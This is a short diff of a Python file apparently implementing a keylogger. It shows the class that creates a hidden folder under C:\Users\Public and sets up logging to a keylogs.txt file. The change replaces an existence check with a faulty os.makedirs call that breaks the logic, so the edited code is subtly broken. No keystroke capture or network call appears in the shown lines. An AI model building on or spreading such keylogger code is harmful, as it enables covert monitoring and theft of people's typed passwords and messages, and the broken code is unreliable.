@@ -73,11 +73,11 @@ class Log():
 class Keylogger():
     def __init__(self, script_name):
         self.script_name = script_name
-    
+  
     def Run_Keylogger(self):
         '''Beschrijving'''
         keylogger_path = r"C:\Users\Public\keylogger"
-        if not os.path.exists(keylogger_path):
+        if not os.makedirs(os.path.join(keylogger_path)):
             os.makedirs(keylogger_path)        
         log_dir = ""
         logging.basicConfig(filename=(log_dir + r"C:\Users\Public\keylogger\keylogs.txt"), \
